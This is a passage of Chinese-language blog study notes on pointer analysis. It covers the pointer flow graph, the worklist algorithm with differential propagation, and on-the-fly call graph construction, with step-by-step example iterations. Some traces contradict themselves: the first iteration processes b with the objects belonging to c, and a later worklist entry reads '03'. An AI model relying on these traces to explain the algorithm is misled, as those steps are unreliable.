<li><code>&#123;Oi&#125;</code>需要传播到<code>pt(x)</code></li>
<li><code>&#123;Oj,Ok&#125;</code>需要传播到<code>pt(y)</code></li>
<li><code>&#123;Ol&#125;</code>需要传播到<code>pt(Oj.f)</code></li>
<li>…..</li>
</ul>
</li>
</ul>

        <h3 id="Handling-of-New-and-Assign"   >
          <a href="#Handling-of-New-and-Assign" class="heading-link"><i class="fas fa-link"></i></a><a href="#Handling-of-New-and-Assign" class="headerlink" title="Handling of New and Assign"></a>Handling of New and Assign</h3>
      <p>算法的前部分是用来处理<code>New</code>和<code>Assign</code>的</p>

        <h4 id="Initialize"   >
          <a href="#Initialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#Initialize" class="headerlink" title="Initialize"></a>Initialize</h4>
      <p>首先进行相关的初始化</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114155802247.png" alt="image-20230114155802247"></p>
<p>遍历所有<code>New</code>和<code>Assign</code>语句</p>
<ul>
<li><p><code>New</code>语句即将相关<code>pair</code>添加到<code>WL</code>中</p>
</li>
<li><p><code>Assign</code>即需要在<code>PFG</code>中添加相关传播关系的边<code>edge</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114155946021.png" alt="image-20230114155946021"></p>
<ul>
<li>如果<code>s-&gt;t</code>这条边在<code>edge</code>中存在则说明有边了，不需要添加了，否则就添加到<code>PFG</code>中</li>
<li>添加完成之后，还需要判断<code>pt(s)</code>是不是空的，如果不是空的则需要将对应<code>pt(s)</code>传播到<code>t</code>指向的对象集中，所以需要将它加入到<code>WL</code>进行后续分析工作</li>
</ul>
</li>
</ul>

        <h4 id="Propagate"   >
          <a href="#Propagate" class="heading-link"><i class="fas fa-link"></i></a><a href="#Propagate" class="headerlink" title="Propagate"></a>Propagate</h4>
      <p>在初始化之后，就需要遍历<code>WL</code>进行传播了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114160853754.png" alt="image-20230114160853754"></p>
<ul>
<li><p>首先从<code>WL</code>中取出</p>
</li>
<li><p>在<code>pts</code>中找到<code>pt(n)</code>中不存在的对象集<code>Δ</code>，因为在<code>pts</code>中存在的对象，在<code>pt(n)</code>中也可能存在，所以需要去掉之后再进行合并操作，避免重复。相关例子如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114161127326.png" alt="image-20230114161127326"></p>
<p>注：最开始其实所有指针的对象集<code>pt(x)</code>都是空的，那么为什么需要去重呢，这个后面会讲到。应该是在动态的创建<code>PFG</code>过程中，<code>pt(x)</code>会不断更新，也会重复被计算。如果不去重的话，其后继中已经被传播的部分就可能再次被传播，从而做了无用功，影响效率。</p>
</li>
<li><p>然后就是传播<code>Propagate(n,Δ)</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114161246125.png" alt="image-20230114161246125"></p>
<ul>
<li>如果<code>pts</code>不为空，就并入到<code>pt(n)</code>中，这个就是实际的传播过去了。</li>
<li>但是传播到<code>pt(n)</code>不够，还需要传播到<code>n</code>可以流向的其他所有节点。所以需要遍历<code>PFG</code>中所有的<code>n-&gt;s</code>，将<code>&lt;s,pts&gt;</code>加入到<code>WL</code>中等待后续处理</li>
</ul>
</li>
</ul>

        <h5 id="Differential-Propagation"   >
          <a href="#Differential-Propagation" class="heading-link"><i class="fas fa-link"></i></a><a href="#Differential-Propagation" class="headerlink" title="Differential Propagation"></a>Differential Propagation</h5>
      <p>这里就是解释了为什么需要差异传播<code>Differential Propagation</code>去重，即避免已经被传播过的信息再被传播造成无用功。</p>
<p>比如如下情况</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116104011048.png" alt="image-20230116104011048"></p>
<p>假设<code>a</code>先传播，结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116104038107.png" alt="image-20230116104038107"></p>
<p>那么<code>b</code>再进行传播，此时<code>c</code>就相当于<code>n</code>，那么<code>pts=&#123;O1,O3,O5&#125;</code>，<code>pt(n)=&#123;O1,O2,O3&#125;</code>，如果不进行差异传播则过程如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116104446528.png" alt="image-20230116104446528"></p>
<p>导致<code>&#123;O1,O3&#125;</code>被重复传播</p>
<p>如果进行差异传播则过程如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116104520952.png" alt="image-20230116104520952"></p>
<p>这样已经被传播过的就不会再被进行计算传播了。</p>
<p>不过这里有个前提，即该算法在每次传播的时候已经确保了<code>pt(n)</code>已经被传播给了<code>n</code>的所有后继。</p>

        <h3 id="Handling-of-Store-and-Load"   >
          <a href="#Handling-of-Store-and-Load" class="heading-link"><i class="fas fa-link"></i></a><a href="#Handling-of-Store-and-Load" class="headerlink" title="Handling of Store and Load"></a>Handling of Store and Load</h3>
      <p>算法循环的后半部分是用来处理<code>Store</code>和<code>Load</code>的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116112641178.png" alt="image-20230116112641178"></p>
<p>关于<code>x</code>指向对象相关成员的所有<code>Store</code>和<code>Load</code>语句都会进行处理，需要遍历所有需要传播的对象集合，即<code>Δ</code></p>
<p>这里需要注意的是，再添加边时，不一定能够添加上。因为在处理<code>x.f=y</code>时，之前可能已经有了<code>A=x;A.f=y</code>这样的，导致在<code>PFG</code>中其实有了这样一条边，就不用再添加了。这也是在<code>AddEdge</code>中进行是否存在边判断的原因。</p>

        <h3 id="实例-2"   >
          <a href="#实例-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例-2" class="headerlink" title="实例"></a>实例</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116114337394.png" alt="image-20230116114337394"></p>
<p>首先初始化<code>WL=[]、PFG=&#123;&#125;</code></p>

        <h4 id="New处理"   >
          <a href="#New处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#New处理" class="headerlink" title="New处理"></a>New处理</h4>
      <p>首先是<code>New</code>处理</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116114833417.png" alt="image-20230116114833417"></p>
<p>语句1和3有<code>New</code>操作，对应<code>O1</code>和<code>O3</code>，添加到<code>WL</code>中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116115029573.png" alt="image-20230116115029573"></p>

        <h4 id="Assign处理"   >
          <a href="#Assign处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#Assign处理" class="headerlink" title="Assign处理"></a>Assign处理</h4>
      <p>然后是<code>Assign</code>处理</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116114849027.png" alt="image-20230116114849027"></p>
<p>语句2和5有<code>Assign</code>操作，进行<code>AddEdge</code>操作</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116114926158.png" alt="image-20230116114926158"></p>
<p>使得<code>PFG</code>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116115004261.png" alt="image-20230116115004261"></p>
<p>由于还没进行传播操作，所以这里<code>b</code>对应的<code>pt(b)</code>和<code>c</code>对应的<code>pt(c)</code>还是空的。</p>
<p>那么在以上两种初始化操作完成后，结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116115127433.png" alt="image-20230116115127433"></p>

        <h4 id="WL处理"   >
          <a href="#WL处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#WL处理" class="headerlink" title="WL处理"></a>WL处理</h4>
      <p><code>Load</code>和<code>Store</code>是在这一部分进行迭代的</p>

        <h5 id="第一次迭代-3"   >
          <a href="#第一次迭代-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一次迭代-3" class="headerlink" title="第一次迭代"></a>第一次迭代</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WL = [&lt;b,&#123;O1&#125;&gt;,&lt;c,&#123;O3&#125;&gt;];</span><br><span class="line">n = b;</span><br><span class="line">WL = [&lt;c,&#123;O3&#125;&gt;];</span><br><span class="line">pts = &#123;O3&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O3&#125; - &#123;&#125; = &#123;O3&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O3&#125;;</span><br><span class="line">	pt(b) = pt(n) = pts ⋃ pt(n) = &#123;O3&#125; ⋃ &#123;&#125; = &#123;O3&#125;;</span><br><span class="line">	b-&gt;a ∈ PFG;</span><br><span class="line">	WL += &lt;a,pts&gt;; =&gt; WL = [&lt;c,&#123;O3&#125;&gt;,&lt;a,&#123;O3&#125;&gt;];</span><br><span class="line"></span><br><span class="line">关于b的成员没有相关Load和Store，循环结束</span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116120125591.png" alt="image-20230116120125591"></p>

        <h5 id="第二次迭代-3"   >
          <a href="#第二次迭代-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二次迭代-3" class="headerlink" title="第二次迭代"></a>第二次迭代</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">WL = [&lt;c,&#123;03&#125;&gt;,&lt;a,&#123;O1&#125;&gt;];</span><br><span class="line">n = c;</span><br><span class="line">WL = [&lt;a,&#123;O1&#125;&gt;];</span><br><span class="line">pts = &#123;O3&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O3&#125; - &#123;&#125; = &#123;O3&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O3&#125;;</span><br><span class="line">	pt(c) = pt(n) = pts ⋃ pt(n) = &#123;O3&#125; ⋃ &#123;&#125; = &#123;O3&#125;;</span><br><span class="line">	c-&gt;d ∈ PFG;</span><br><span class="line">	WL += &lt;d,pts&gt;; =&gt; WL = [&lt;a,&#123;O1&#125;&gt;,&lt;d,&#123;O3&#125;&gt;];</span><br><span class="line"></span><br><span class="line">Load and Store:</span><br><span class="line">	c.f存在相关语句</span><br><span class="line">	O3 ∈ Δ = &#123;O3&#125;;</span><br><span class="line">	c.f = a:</span><br><span class="line">		a-&gt;c.f = a-&gt;O3.f ∉ PFG;</span><br><span class="line">		PFG += a-&gt;O3.f;</span><br><span class="line">		pt(a)=&#123;&#125;;</span><br><span class="line">	c.f = d:</span><br><span class="line">		d-&gt;c.f = d-&gt;O3.f ∉ PFG;</span><br><span class="line">		PFG += d-&gt;O3.f;</span><br><span class="line">		pt(d)=&#123;&#125;;</span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116121324230.png" alt="image-20230116121324230"></p>

        <h5 id="第三次迭代-2"   >
          <a href="#第三次迭代-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三次迭代-2" class="headerlink" title="第三次迭代"></a>第三次迭代</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WL = [&lt;a,&#123;O1&#125;&gt;,&lt;d,&#123;O3&#125;&gt;];</span><br><span class="line">n = a;</span><br><span class="line">WL = [&lt;d,&#123;O3&#125;&gt;];</span><br><span class="line">pts = &#123;O1&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O1&#125; - &#123;&#125; = &#123;O1&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O1&#125;;</span><br><span class="line">	pt(a) = pt(n) = pts ⋃ pt(n) = &#123;O1&#125; ⋃ &#123;&#125; = &#123;O1&#125;;</span><br><span class="line">	a-&gt;O3.f ∈ PFG;</span><br><span class="line">	WL += &lt;O3.f,pts&gt;; =&gt; WL = [&lt;d,&#123;O3&#125;&gt;,&lt;O3.f,&#123;O1&#125;&gt;];</span><br><span class="line"></span><br><span class="line">关于a的成员没有相关Load和Store，循环结束</span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116123211552.png" alt="image-20230116123211552"></p>

        <h5 id="第四次迭代"   >
          <a href="#第四次迭代" class="heading-link"><i class="fas fa-link"></i></a><a href="#第四次迭代" class="headerlink" title="第四次迭代"></a>第四次迭代</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">WL = [&lt;d,&#123;O3&#125;&gt;,&lt;O3.f,&#123;O1&#125;&gt;];</span><br><span class="line">n = d;</span><br><span class="line">WL = [&lt;O3.f,&#123;O1&#125;&gt;];</span><br><span class="line">pts = &#123;O3&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O3&#125; - &#123;&#125; = &#123;O3&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O3&#125;;</span><br><span class="line">	pt(d) = pt(n) = pts ⋃ pt(n) = &#123;O3&#125; ⋃ &#123;&#125; = &#123;O3&#125;;</span><br><span class="line">	d-&gt;O3.f ∈ PFG;</span><br><span class="line">	WL += &lt;O3.f,pts&gt;; =&gt; WL = [&lt;O3.f,&#123;O1&#125;&gt;,&lt;O3.f,&#123;O3&#125;&gt;];</span><br><span class="line">	</span><br><span class="line">Load and Store:</span><br><span class="line">	d.f存在相关语句</span><br><span class="line">	O3 ∈ Δ = &#123;O3&#125;;</span><br><span class="line">	e = d.f:</span><br><span class="line">		d.f-&gt;e = O3.f-&gt;e ∉ PFG;</span><br><span class="line">		PFG += O3.f-&gt;e;</span><br><span class="line">		pt(O3.f) = &#123;&#125;;</span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116123300983.png" alt="image-20230116123300983"></p>

        <h5 id="第五次迭代"   >
          <a href="#第五次迭代" class="heading-link"><i class="fas fa-link"></i></a><a href="#第五次迭代" class="headerlink" title="第五次迭代"></a>第五次迭代</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WL = [&lt;O3.f,&#123;O1&#125;&gt;,&lt;O3.f,&#123;O3&#125;&gt;];</span><br><span class="line">n = O3.f;</span><br><span class="line">WL = [&lt;O3.f,&#123;O3&#125;&gt;];</span><br><span class="line">pts = &#123;O1&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O1&#125; - &#123;&#125; = &#123;O1&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O1&#125;;</span><br><span class="line">	pt(O3.f) = pt(n) = pts ⋃ pt(n) = &#123;O1&#125; ⋃ &#123;&#125; = &#123;O1&#125;;</span><br><span class="line">	O3.f-&gt;e ∈ PFG;</span><br><span class="line">	WL += &lt;e,pts&gt;; =&gt; WL = [&lt;O3.f,&#123;O3&#125;&gt;,&lt;e,&#123;O1&#125;&gt;];</span><br><span class="line"></span><br><span class="line">关于O3.f的成员没有相关Load和Store，循环结束</span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116140630003.png" alt="image-20230116140630003"></p>

        <h5 id="第六次迭代"   >
          <a href="#第六次迭代" class="heading-link"><i class="fas fa-link"></i></a><a href="#第六次迭代" class="headerlink" title="第六次迭代"></a>第六次迭代</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WL = [&lt;O3.f,&#123;O3&#125;&gt;,&lt;e,&#123;O1&#125;&gt;];</span><br><span class="line">n = O3.f;</span><br><span class="line">WL = [&lt;e,&#123;O1&#125;&gt;];</span><br><span class="line">pts = &#123;O3&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O3&#125; - &#123;O1&#125; = &#123;O3&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O3&#125;;</span><br><span class="line">	pt(O3.f) = pt(n) = pts ⋃ pt(n) = &#123;O3&#125; ⋃ &#123;O1&#125; = &#123;O1,O3&#125;;</span><br><span class="line">	O3.f-&gt;e ∈ PFG;</span><br><span class="line">	WL += &lt;e,pts&gt;; =&gt; WL = [&lt;e,&#123;O1&#125;&gt;,&lt;e,&#123;O3&#125;&gt;];</span><br><span class="line"></span><br><span class="line">关于O3.f的成员没有相关Load和Store，循环结束</span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116140900865.png" alt="image-20230116140900865"></p>

        <h5 id="第七次迭代"   >
          <a href="#第七次迭代" class="heading-link"><i class="fas fa-link"></i></a><a href="#第七次迭代" class="headerlink" title="第七次迭代"></a>第七次迭代</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WL = [&lt;e,&#123;O1&#125;&gt;,&lt;e,&#123;O3&#125;&gt;];</span><br><span class="line">n = e;</span><br><span class="line">WL = [&lt;e,&#123;O3&#125;&gt;];</span><br><span class="line">pts = &#123;O1&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O1&#125; - &#123;&#125; = &#123;O1&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O1&#125;;</span><br><span class="line">	pt(e) = pt(n) = pts ⋃ pt(n) = &#123;O1&#125; ⋃ &#123;&#125; = &#123;O1&#125;;</span><br><span class="line">	e没有后继</span><br><span class="line"></span><br><span class="line">关于e的成员没有相关Load和Store，循环结束</span><br></pre></td></tr></table></div></figure>


        <h5 id="第八次迭代"   >
          <a href="#第八次迭代" class="heading-link"><i class="fas fa-link"></i></a><a href="#第八次迭代" class="headerlink" title="第八次迭代"></a>第八次迭代</h5>
      <p>和第七次类似</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WL = [&lt;e,&#123;O3&#125;&gt;];</span><br><span class="line">n = e;</span><br><span class="line">WL = [];</span><br><span class="line">pts = &#123;O3&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O3&#125; - &#123;O1&#125; = &#123;O3&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O3&#125;;</span><br><span class="line">	pt(e) = pt(n) = pts ⋃ pt(n) = &#123;O3&#125; ⋃ &#123;O1&#125; = &#123;O1,O3&#125;;</span><br><span class="line">	e没有后继</span><br><span class="line"></span><br><span class="line">关于e的成员没有相关Load和Store，循环结束</span><br></pre></td></tr></table></div></figure>

<p><code>WL</code>为空，算法结束，最终结果为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116141524281.png" alt="image-20230116141524281"></p>

        <h2 id="总结-3"   >
          <a href="#总结-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116142223691.png" alt="image-20230116142223691"></p>
<p>理解指针分析的规则，<code>PFG</code>，以及对应的算法</p>

        <h1 id="九、Pointer-Analysis-Foundations-II"   >
          <a href="#九、Pointer-Analysis-Foundations-II" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、Pointer-Analysis-Foundations-II" class="headerlink" title="九、Pointer Analysis Foundations (II)"></a>九、Pointer Analysis Foundations (II)</h1>
      
        <h2 id="4-Pointer-Analysis-with-Method-Calls"   >
          <a href="#4-Pointer-Analysis-with-Method-Calls" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Pointer-Analysis-with-Method-Calls" class="headerlink" title="4.Pointer Analysis with Method Calls"></a>4.Pointer Analysis with Method Calls</h2>
      <p>结合之前的<code>CHA</code>和指针分析，来做过程间的指针分析</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116153358145.png" alt="image-20230116153358145"></p>
<p>在指针分析的过程中做<code>call graph</code>，即<code>on-the-fly call graph construction</code>。</p>
<p>指针分析更加准确，在做过程间的分析时就会使得<code>call graph</code>做的更好，因为不用再依据声明的对象来寻找方法，而是直接通过指针指向的对象来获取方法，更加准确。</p>
<p>而<code>call graph</code>做的越好，其虚假边就会更少，从而指针分析就会更加准确。这两者是互相成就。</p>
<p>只会分析可达方法，不可达方法不进行指针分析，提升精度和效率。</p>

        <h3 id="Rule-Call"   >
          <a href="#Rule-Call" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-Call" class="headerlink" title="Rule : Call"></a>Rule : Call</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116161005808.png" alt="image-20230116161005808"></p>
<p>符号含义：</p>
<ul>
<li><code>Dispatch(Oi,k) </code> : 和之前一样，通过传入对象指针和函数签名寻找函数，本类找不到找父类</li>
<li><code>M_this</code> : 函数<code>m</code>中的<code>this</code>变量</li>
<li><code>M_pj</code> : 函数<code>m</code>中的第<code>j</code>个参数</li>
<li><code>M_ret</code> : 函数<code>M</code>的返回值</li>
</ul>
<p>即相关的传递指针<br>$$<br>\begin{align}<br>&amp;O_i\in pt(x),m=Dispatch(O_i,k)\ &amp;=&gt;&amp;\ O_i\in pt(m_{this})&amp;(传递this指针,不用在PFG连边)\<br>&amp;O_u\in pt(a_j),1\leqslant j\leqslant n\ &amp;=&gt;&amp;\ O_u\in pt(m_{pj}),1\leqslant j\leqslant n&amp;(传递参数指针,需要在PFG连边)\<br>&amp;O_v\in pt(m_{ret}) &amp;=&gt;&amp;\ O_v\in pt(r)&amp;(传递ret指针,需要在PFG连边)\<br>\end{align}<br>$$<br>需要注意的是<code>this</code>传递的时候是不用在<code>PFG</code>中进行连边处理的，因为如果连边处理的话，那么<code>pt(x)</code>包含的所有对象都会流入到不同的类中，情形如下，就会多出无效的对象要处理，浪费资源。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116175017004.png" alt="image-20230116175017004"></p>

        <h3 id="Algorithms"   >
          <a href="#Algorithms" class="heading-link"><i class="fas fa-link"></i></a><a href="#Algorithms" class="headerlink" title="Algorithms"></a>Algorithms</h3>
      <p>相关算法</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116182119855.png" alt="image-20230116182119855"></p>
<p>相关概念已经解释很清楚了</p>

        <h4 id="AddReachable-𝑚"   >
          <a href="#AddReachable-𝑚" class="heading-link"><i class="fas fa-link"></i></a><a href="#AddReachable-𝑚" class="headerlink" title="AddReachable(𝑚)"></a>AddReachable(𝑚)</h4>
      <p>程序最开始、以及新的<code>call graph</code>边被添加时都会调用到，该方法的功能其实就是对于一个方法中所有可达语句进行相关的初始化。</p>
<p>可以看到最开始进入的方法是<code>m^entry</code>，借助是否发现新方法来对<code>WL</code>以及<code>PFG</code>进行更新。</p>
<p>对于最开始调用，即<code>m^entry</code>作为新方法传入时。和之前差不多，只是添加了一些关于是否可达的语句进来，用来进行<code>New</code>和<code>Assign</code>相关对象指针初始化、<code>WL</code>和<code>RM</code>的初始化、以及<code>PFG</code>的初始化。</p>
<p>而对于后续发现新方法，都是进行针对新方法的一些指针分析初始化，类似的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230116182315115.png" alt="image-20230116182315115"></p>
<p>注：新方法的初始化是不能对<code>Load</code>和<code>Store</code>以及<code>Call</code>进行处理的，因为这些都需要依赖于<code>New</code>和<code>Assign</code>。</p>

        <h4 id="ProcessCall-𝑥-O𝑖"   >
          <a href="#ProcessCall-𝑥-O𝑖" class="heading-link"><i class="fas fa-link"></i></a><a href="#ProcessCall-𝑥-O𝑖" class="headerlink" title="ProcessCall(𝑥, O𝑖)"></a>ProcessCall(𝑥, O𝑖)</h4>
      <p>上述初始化之后的后续部分都差不多，只是在大循环中多了一个<code>ProcessCall</code>进行新方法的发现添加。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227111848832.png" alt="image-20230227111848832"></p>
<p>针对某个变量的<code>WL</code>的处理，都需要对所有可<code>reachable</code>的函数进行处理传递</p>

        <h4 id="Output"   >
          <a href="#Output" class="heading-link"><i class="fas fa-link"></i></a><a href="#Output" class="headerlink" title="Output"></a>Output</h4>
      <p>得到相关的指针集<code>(Points-to Relations (pt))</code>以及调用图<code>(Call Graph)</code></p>

        <h4 id="实例-3"   >
          <a href="#实例-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例-3" class="headerlink" title="实例"></a>实例</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227144343229.png" alt="image-20230227144343229"></p>

        <h5 id="初始化"   >
          <a href="#初始化" class="heading-link"><i class="fas fa-link"></i></a><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h5>
      <p>首先是初始化，经过<code>AddReachable(m_entry)</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227144513373.png" alt="image-20230227144513373"></p>
<p>得到如下结果</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RM = &#123;A.main()&#125;</span><br><span class="line">WL = [&lt;a,&#123;O3&#125;&gt;,&lt;b,&#123;O4&#125;&gt;]</span><br><span class="line">由于没有x=y之类的语句,没有调用到AddEdge</span><br><span class="line">CG = &#123;&#125;</span><br><span class="line">PFG = &#123;&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="WL处理-1"   >
          <a href="#WL处理-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#WL处理-1" class="headerlink" title="WL处理"></a>WL处理</h5>
      
        <h6 id="第一次迭代-4"   >
          <a href="#第一次迭代-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一次迭代-4" class="headerlink" title="第一次迭代"></a>第一次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;a,&#123;O3&#125;&gt;;</span><br><span class="line">WL = [&lt;b,&#123;O4&#125;&gt;];</span><br><span class="line">RM = &#123;A.main()&#125;;</span><br><span class="line">CG = &#123;&#125;;</span><br><span class="line">PFG = &#123;&#125;;</span><br><span class="line">n = a;</span><br><span class="line">pts = &#123;O3&#125;;</span><br><span class="line">Δ = 